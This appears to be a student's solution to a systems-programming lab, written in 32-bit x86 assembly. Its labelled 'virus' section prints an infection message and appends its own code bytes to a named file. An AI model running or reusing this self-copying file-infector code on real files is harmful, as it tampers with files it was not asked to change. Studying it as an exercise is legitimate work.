; ===============================
;  Task 2.B — start.s
; ===============================

section .data
infect_msg db "Hello, Infected File", 10
infect_len equ $ - infect_msg

section .text
global _start
global system_call
global infection
global infector
extern main

; -------------------------------------------------
; Program entry point (PROVIDER CODE — DO NOT EDIT)
; -------------------------------------------------
_start:
    pop    dword ecx        ; ecx = argc
    mov    esi, esp         ; esi = argv

    mov     eax, ecx
    shl     eax, 2
    add     eax, esi
    add     eax, 4          ; skip NULL after argv
    push    dword eax       ; envp
    push    dword esi       ; argv
    push    dword ecx       ; argc

    call    main

    mov     ebx, eax
    mov     eax, 1          ; SYS_EXIT
    int     0x80


; -------------------------------------------------
; system_call wrapper (PROVIDER CODE — DO NOT EDIT)
; -------------------------------------------------
system_call:
    push    ebp
    mov     ebp, esp
    sub     esp, 4
    pushad

    mov     eax, [ebp+8]
    mov     ebx, [ebp+12]
    mov     ecx, [ebp+16]
    mov     edx, [ebp+20]
    int     0x80

    mov     [ebp-4], eax
    popad
    mov     eax, [ebp-4]
    add     esp, 4
    pop     ebp
    ret


; =================================================
; ============ VIRUS CODE SECTION =================
; =================================================
code_start:

; -------------------------------------------------
; void infection()
; prints "Hello, Infected File\n"
; EXACTLY ONE SYSCALL
; -------------------------------------------------
infection:
    mov eax, 4              ; SYS_WRITE
    mov ebx, 1              ; stdout
    mov ecx, infect_msg
    mov edx, infect_len
    int 0x80
    ret


; -------------------------------------------------
; void infector(char *filename)
; open → append virus code → close
; -------------------------------------------------
infector:
    push ebp
    mov  ebp, esp

    ; open(filename, O_WRONLY | O_APPEND)
    mov ebx, [ebp+8]        ; filename
    mov eax, 5              ; SYS_OPEN
    mov ecx, 1025           ; O_WRONLY | O_APPEND
    mov edx, 0
    int 0x80

    cmp eax, 0
    jl  .done               ; open failed

    mov esi, eax            ; save fd

    ; write(fd, code_start, code_end - code_start)
    mov eax, 4              ; SYS_WRITE
    mov ebx, esi
    mov ecx, code_start
    mov edx, code_end - code_start
    int 0x80

    ; close(fd)
    mov eax, 6              ; SYS_CLOSE
    mov ebx, esi
    int 0x80

.done:
    leave
    ret

code_end:
; =================================================
; ========== END OF VIRUS CODE ====================
; =================================================